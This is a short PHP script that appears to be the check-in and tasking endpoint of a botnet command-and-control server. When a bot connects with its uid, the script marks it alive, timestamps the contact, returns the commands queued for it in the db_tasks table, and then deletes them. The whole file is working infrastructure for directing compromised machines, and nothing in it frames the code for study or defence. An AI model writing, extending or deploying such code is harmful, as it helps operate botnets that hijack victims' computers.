<?php
	include('include/connection.php');

	// Check if a UID was passed to the URL
	if (isset($_GET['uid'])){
		$sock = getDBSock();
		$uid = mysqli_real_escape_string($sock, $_GET['uid']);

		// Update latest connection from the bot + it is alive
		$tstamp = time();
		$sql = "UPDATE db_bots SET t_on='$tstamp' WHERE uid='$uid'";
		$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock));

		$sql = "UPDATE db_bots SET status='1' WHERE uid='$uid'";
		$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock));

		// Retrieve tasks from the bot for sending them it
		$sql = "SELECT params FROM db_tasks WHERE uid='$uid'";
		$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock));
		if (!$result)
			exit;

		$action = "";
		$count = 0; // Actions counter

		// Get all tasks to accomplish by the bot
		while ($data = mysqli_fetch_array($result)) {
			$action.= $data['params'].'|';
			$count++;
		}

		if($count > 0) {
			$action = substr($action, 0, strlen($action)-1);
			echo $action;
		}
		else
			exit();

		// Delete all tasks for the bot
		$sql = "DELETE FROM db_tasks WHERE uid='$uid'";
		mysqli_query($sock, $sql) or die(mysqli_error($sock));

		mysqli_close($sock);
	}
?>
